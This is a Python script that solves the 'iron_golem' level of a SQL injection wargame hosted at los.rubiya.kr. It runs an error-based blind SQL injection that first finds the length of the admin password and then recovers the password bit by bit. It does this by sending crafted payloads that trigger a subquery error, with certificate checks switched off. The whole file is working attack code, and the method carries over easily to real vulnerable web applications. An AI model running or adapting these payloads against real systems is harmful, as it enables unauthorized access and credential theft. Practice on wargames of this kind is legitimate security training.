import requests

requests.packages.urllib3.disable_warnings()
sess = requests.session()
URL = 'https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw='
headers = {'Cookie': ''}

# get length of column  ==========================

passwordLen = 0

for i in range(1, 100):
    payload = "' or id='admin' and if(length(pw)={},1,(select 1 union select 2))%23".format(i)
    res = sess.get(url=URL + payload, headers=headers, verify=False)

    if 'Subquery' in res.text:
        pass
    else:
        passwordLen = i
        break

print('[=] Find Password Length : %d' % passwordLen)

bitLen = 16
Password = ''

for j in range(1, passwordLen + 1):

    bit = ''

    for i in range(1, bitLen + 1):
        payload = "' or id='admin' and if(substr(lpad(bin(ord(substr(pw,{},1))),{},0),{},1)=1,1,(select 1 union select 2))%23".format(
            j, bitLen, i)
        res = sess.get(url=URL + payload, headers=headers, verify=False)

        if 'Subquery' in res.text:
            # Error Occured!! It is not 1
            bit += '0'
        else:
            # false!!
            bit += '1'

    Password += chr(int(bit, 2))
    print('[=] Find Password(count %02d) : %s (bit : %s) (hex : %s)' % (j, chr(int(bit, 2)), bit, hex(int(bit, 2))[2:]))

print('[=] Find Password : %s' % Password)

